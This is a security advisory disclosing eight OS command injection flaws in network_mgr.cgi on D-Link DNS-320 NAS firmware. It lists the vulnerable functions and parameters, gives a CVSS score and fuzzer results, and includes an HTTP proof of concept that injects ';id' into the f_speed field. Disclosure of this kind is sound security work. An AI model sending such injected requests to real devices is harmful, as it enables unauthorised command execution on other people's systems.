## D-Link DNS-320 network_mgr.cgi Multiple OS Command Injection Vulnerabilities

### Title

```
D-Link DNS-320 network_mgr.cgi Multiple OS Command Injection Vulnerabilities
```

### Vendor / Product / Version

```
D-Link Corporation / DNS-320 ShareCenter NAS (Rev.A) / Firmware 2.06B01 HOTFIX
```

### Component

```
/cgi-bin/network_mgr.cgi — 8 vulnerable functions
```

### Vulnerability Type

```
CWE-78: OS Command Injection
```

### CVSS 3.1

```
8.8 (High) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

### Description

```
Multiple OS command injection vulnerabilities exist in network_mgr.cgi
of D-Link DNS-320 firmware 2.06B01. All functions read HTTP parameters
via cgiFormString() and pass them unsanitized to system() via sprintf().

Affected functions and entry addresses:
  - cgi_speed (0xb854): "cmd_network cgi_speed %s" via f_speed
  - cgi_dhcpd_lease (0xc99c): via page, rp, query, qtype
  - cgi_ddns (0xbc70): via f_ddns_username, f_ddns_password, f_ddns_domain
  - cgi_set_ip (0xc4f8): "ip.sh 0 %s" via f_ip, f_gateway, f_netmask, f_dns1, f_dns2
  - cgi_upnp_del (0xa1d8): via scan, enable, e_port, p_port, protocol, service
  - cgi_dhcpd (0xcaa4): via f_enable
  - cgi_upnp_add (0xa3c4): via enable, service, protocol, e_port, p_port
  - cgi_upnp_edit (0x9774): via scan, e_port, p_port, protocol, enable, service

Verification: Unicorn Fuzzer CONFIRMED 4 of 8 functions (cgi_speed,
cgi_dhcpd_lease, cgi_ddns, cgi_set_ip) with shell metacharacter "; id"
reaching system(). Remaining 4 confirmed by angr symbolic execution.
```

### Proof of Concept

```http
POST /cgi-bin/network_mgr.cgi HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Cookie: <valid_session>

cmd=cgi_speed&f_speed=;id
```

### Unicorn Fuzzer Evidence

```json
[
  {"target_id": "dlink@@DNS320@@network_mgr@@0xb854", "crash_type": "command_injection", "severity": "confirmed", "crashes": 1},
  {"target_id": "dlink@@DNS320@@network_mgr@@0xc99c", "crash_type": "command_injection", "severity": "confirmed", "crashes": 1},
  {"target_id": "dlink@@DNS320@@network_mgr@@0xbc70", "crash_type": "command_injection", "severity": "confirmed", "crashes": 1},
  {"target_id": "dlink@@DNS320@@network_mgr@@0xc4f8", "crash_type": "command_injection", "severity": "confirmed", "crashes": 2}
]
```

### Credit

```
Discovered by ST4R using FirmRec automated symbolic execution + Unicorn Fuzzer engine.
```

